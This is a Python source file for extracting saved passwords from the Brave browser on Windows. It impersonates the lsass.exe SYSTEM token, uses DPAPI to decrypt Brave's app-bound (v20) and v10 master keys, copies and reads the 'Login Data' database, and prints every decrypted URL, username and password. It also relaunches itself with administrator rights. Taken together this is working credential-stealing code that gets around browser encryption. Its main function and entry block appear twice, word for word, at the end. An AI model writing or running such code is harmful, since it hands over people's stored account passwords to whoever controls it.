import os
import shutil
import json
import ctypes
import sqlite3
import pathlib
import binascii
import tempfile
import sys
from contextlib import contextmanager
from typing import List, Dict, Optional, Callable, Any
from pathlib import Path

import windows
import windows.crypto
import windows.generated_def as gdef
from cryptography.hazmat.primitives.ciphers.aead import AESGCM


def is_admin() -> bool:
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False


@contextmanager
def impersonate_lsass():
    """impersonate lsass.exe to get SYSTEM privilege"""
    original_token = windows.current_thread.token
    try:
        windows.current_process.token.enable_privilege("SeDebugPrivilege")
        proc = next(p for p in windows.system.processes if p.name == "lsass.exe")
        lsass_token = proc.token
        impersonation_token = lsass_token.duplicate(
            type=gdef.TokenImpersonation,
            impersonation_level=gdef.SecurityImpersonation
        )
        windows.current_thread.token = impersonation_token
        yield
    finally:
        windows.current_thread.token = original_token


def cleanup_brave_extracted_files() -> None:
    """
    Deletes leftover BraveData.json and DllExtractChromiumSecrets.dll if present from previous runs.
    """
    extractor_dir = Path(__file__).resolve().parent / "brave"
    for filename in ("BraveData.json", "DllExtractChromiumSecrets.dll"):
        file_path = extractor_dir / filename
        if file_path.is_file():
            try:
                os.remove(file_path)
            except OSError:
                pass


def derive_brave_ciphers(local_state_path: str,
                         log_callback: Optional[Callable[[str], None]] = None):
    """
    Returns (v20_cipher, v10_cipher) derived from a Brave Local State file.
    """
    v20_cipher = None
    v10_cipher = None

    if not local_state_path or not os.path.isfile(str(local_state_path)):
        return v20_cipher, v10_cipher

    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
    except Exception as e:
        if log_callback:
            log_callback(f"Failed to read Local State: {e}")
        return v20_cipher, v10_cipher

    os_crypt = local_state.get("os_crypt", {})
    app_bound_encrypted_key = os_crypt.get("app_bound_encrypted_key")
    encrypted_key = os_crypt.get("encrypted_key")

    # 1. Derive v20 Master Key (Brave simplified path)
    if app_bound_encrypted_key:
        if not is_admin():
            if log_callback:
                log_callback("Admin privileges required for Brave v20 decryption.")
        else:
            try:
                raw_appb = binascii.a2b_base64(app_bound_encrypted_key)
                if raw_appb[:4] == b"APPB":
                    key_blob_encrypted = raw_appb[4:]
                    with impersonate_lsass():
                        key_blob_system_decrypted = windows.crypto.dpapi.unprotect(key_blob_encrypted)
                    key_blob_user_decrypted = windows.crypto.dpapi.unprotect(key_blob_system_decrypted)

                    if len(key_blob_user_decrypted) >= 32:
                        v20_master_key = key_blob_user_decrypted[-32:]
                        v20_cipher = AESGCM(v20_master_key)
                        if log_callback:
                            log_callback("Derived Brave v20 master key via DPAPI.")
                    else:
                        if log_callback:
                            log_callback(f"Unexpected v20 key length: {len(key_blob_user_decrypted)}")
            except Exception as e:
                if log_callback:
                    log_callback(f"Failed to derive Brave v20 master key: {e}")

    # 2. Derive v10 Master Key (Standard DPAPI path)
    if encrypted_key:
        try:
            raw_key = binascii.a2b_base64(encrypted_key)
            if raw_key[:5] == b"DPAPI":
                v10_master_key = windows.crypto.dpapi.unprotect(raw_key[5:])
                v10_cipher = AESGCM(v10_master_key)
                if log_callback:
                    log_callback("Derived Brave v10 master key via DPAPI.")
        except Exception as e:
            if log_callback:
                log_callback(f"Failed to derive Brave v10 master key: {e}")

    return v20_cipher, v10_cipher


def extract_brave_passwords(profile_dir_path: str,
                            local_state_path: Optional[Any] = None,
                            log_callback: Optional[Callable[[str], None]] = None) -> List[Dict[str, str]]:
    """
    Pure Python password extractor for Brave browser.
    Extracts and decrypts saved passwords from a Brave profile directory.
    """
    # Allow passing log_callback as second positional argument
    if callable(local_state_path) and log_callback is None:
        log_callback = local_state_path
        local_state_path = None

    profile_dir = Path(profile_dir_path)
    login_db_path = profile_dir / "Login Data"

    if not login_db_path.is_file():
        if log_callback:
            log_callback(f"Login Data not found at {login_db_path}")
        return []

    # Local State is usually in the parent of the profile folder (e.g., User Data/Local State)
    if not local_state_path or not os.path.isfile(str(local_state_path)):
        candidate = profile_dir.parent / "Local State"
        if candidate.is_file():
            local_state_path = str(candidate)
        else:
            candidate = profile_dir / "Local State"
            if candidate.is_file():
                local_state_path = str(candidate)

    if not local_state_path or not os.path.isfile(str(local_state_path)):
        if log_callback:
            log_callback(f"Local State not found for {profile_dir}")
        return []

    v20_cipher, v10_cipher = derive_brave_ciphers(local_state_path, log_callback)

    # 4. Extract and decrypt logins
    results: List[Dict[str, str]] = []
    with tempfile.TemporaryDirectory() as temp_dir:
        temp_db_path = os.path.join(temp_dir, "TempLoginData")
        try:
            shutil.copy2(str(login_db_path), temp_db_path)
            # Copy WAL file if it exists
            wal_source = login_db_path.with_name(login_db_path.name + "-wal")
            if wal_source.is_file():
                try:
                    shutil.copy2(str(wal_source), os.path.join(temp_dir, "TempLoginData-wal"))
                except Exception:
                    pass
        except PermissionError:
            if log_callback:
                log_callback("Brave is running and locking Login Data. Close Brave and try again.")
            return []
        except Exception as e:
            if log_callback:
                log_callback(f"Failed to copy Login Data: {e}")
            return []

        try:
            db_uri = f"file:{pathlib.Path(temp_db_path).as_posix()}?mode=ro"
            con = sqlite3.connect(db_uri, uri=True)
            cur = con.cursor()
            cur.execute("SELECT origin_url, username_value, CAST(password_value AS BLOB) FROM logins")
            logins = cur.fetchall()
            con.close()
        except Exception as e:
            if log_callback:
                log_callback(f"Failed to query database: {e}")
            return []

        for url, username, encrypted_pwd in logins:
            if not encrypted_pwd:
                continue
            url = url or ""
            username = username or ""
            password = ""

            try:
                if encrypted_pwd.startswith(b"v20"):
                    if v20_cipher:
                        nonce = encrypted_pwd[3:15]
                        ciphertext = encrypted_pwd[15:-16]
                        tag = encrypted_pwd[-16:]
                        decrypted = v20_cipher.decrypt(nonce, ciphertext + tag, None)
                        password = decrypted.decode('utf-8', errors='replace')
                    else:
                        password = "(v20 key unavailable)"
                elif encrypted_pwd.startswith(b"v10"):
                    if v10_cipher:
                        nonce = encrypted_pwd[3:15]
                        ciphertext = encrypted_pwd[15:-16]
                        tag = encrypted_pwd[-16:]
                        decrypted = v10_cipher.decrypt(nonce, ciphertext + tag, None)
                        password = decrypted.decode('utf-8', errors='replace')
                    else:
                        password = "(v10 key unavailable)"
                else:
                    # Legacy DPAPI
                    try:
                        decrypted = windows.crypto.dpapi.unprotect(encrypted_pwd)
                        password = decrypted.decode('utf-8', errors='replace')
                    except Exception:
                        password = "(decryption failed)"

                results.append({"hostname": url, "username": username, "password": password})
            except Exception as e:
                if log_callback:
                    log_callback(f"Failed to decrypt entry for {url}: {e}")
                results.append({"hostname": url, "username": username, "password": "(decryption failed)"})

    return results


def main():
    import sys
    from argparse import ArgumentParser

    parser = ArgumentParser(description="Extract and decrypt Brave saved passwords")
    parser.add_argument("-d", "--dir", dest="directory", help="Path to Brave profile directory")
    args = parser.parse_args()

    if args.directory:
        profile_dir = Path(args.directory)
    else:
        user_profile = os.environ.get("USERPROFILE", "")
        profile_dir = Path(user_profile) / "AppData" / "Local" / "BraveSoftware" / "Brave-Browser" / "User Data" / "Default"

    print(f"Extracting Brave passwords from: {profile_dir}")
    passwords = extract_brave_passwords(str(profile_dir), log_callback=print)
    print(f"\nExtracted {len(passwords)} password(s):")
    for p in passwords:
        print(f"URL: {p['hostname']}")
        print(f"Username: {p['username']}")
        print(f"Password: {p['password']}\n")


if __name__ == "__main__":
    if not is_admin():
        import subprocess
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, subprocess.list2cmdline(sys.argv), None, 1
        )
        sys.exit()
    else:
        main()



def main():
    import sys
    from argparse import ArgumentParser

    parser = ArgumentParser(description="Extract and decrypt Brave saved passwords")
    parser.add_argument("-d", "--dir", dest="directory", help="Path to Brave profile directory")
    args = parser.parse_args()

    if args.directory:
        profile_dir = Path(args.directory)
    else:
        user_profile = os.environ.get("USERPROFILE", "")
        profile_dir = Path(user_profile) / "AppData" / "Local" / "BraveSoftware" / "Brave-Browser" / "User Data" / "Default"

    print(f"Extracting Brave passwords from: {profile_dir}")
    passwords = extract_brave_passwords(str(profile_dir), log_callback=print)
    print(f"\nExtracted {len(passwords)} password(s):")
    for p in passwords:
        print(f"URL: {p['hostname']}")
        print(f"Username: {p['username']}")
        print(f"Password: {p['password']}\n")


if __name__ == "__main__":
    if not is_admin():
        import subprocess
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, subprocess.list2cmdline(sys.argv), None, 1
        )
        sys.exit()
    else:
        main()